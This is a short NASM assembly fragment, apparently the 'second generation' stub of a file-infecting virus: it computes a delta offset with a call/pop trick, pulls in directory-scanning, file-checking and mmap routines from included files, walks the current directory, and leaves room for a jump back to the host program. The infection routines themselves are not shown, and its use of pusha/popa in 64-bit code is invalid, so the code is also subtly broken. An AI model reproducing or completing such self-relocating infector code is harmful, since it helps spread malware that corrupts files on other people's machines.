;//////////////////////////////////////////////////////////////////////////////
;// 
;//  Second Generation
;//
;///////////////////////////////////////////////////////////////////////////////

Main_2_GEN:   jmp          MESSAGE
              
;/////////////////////////////////////////////////////////////////////////////// 

%include "dir.asm"
%include "checkfile.asm"
%include "mmap.asm"  

SPATH:        db      './'
LEN_SPATH     equ     $ - SPATH

;///////////////////////////////////////////////////////////////////////////////        

MESSAGE:    pusha
            
              call         BASE_2_GEN 
BASE_2_GEN:   pop          rbx
              sub          rbx,             BASE_2_GEN           ; rbx == DELTA          

              ;///////////////////////////////////////////////
              
              xor          rdi,             rdi
              lea          rsi,            [rbx + SPATH]
              mov          rax,             LEN_SPATH
              call         DIR 

            popa

OUT_2_GEN: ; + RETURN JUMP 6Bytes

;//////////////////////////////////////////////////////////////////
;// 
;//  Second Generation
;//
;/////////////////////////////////////////////////////////////////////////////// 
